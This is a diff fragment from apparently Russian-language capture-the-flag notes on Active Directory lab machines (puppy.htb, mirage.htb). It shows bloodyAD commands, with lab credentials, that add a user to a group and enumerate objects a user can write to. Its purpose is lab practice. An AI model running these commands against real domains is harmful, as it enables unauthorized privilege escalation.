@@ -197,3 +197,8 @@ python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_
 
 # Шаг 2: Теперь добавить себя
 python3 bloodyAD.py -d puppy.htb -u levi.james -p 'KingofAkron2025!' --host <DC_IP> addGroupMember 'DEVELOPERS' 'levi.james'
+
+
+# Проверить в отношении гого пользователь можеть писать ACL (выполняет запрос к контроллеру домена Active Directory для получения списка всех объектов, к которым у текущего пользователя (mark.bbond) есть права на запись).
+
+    bloodyAD --host dc01.mirage.htb -u mark.bbond -p '1day@atime' -k -d mirage.htb get writable
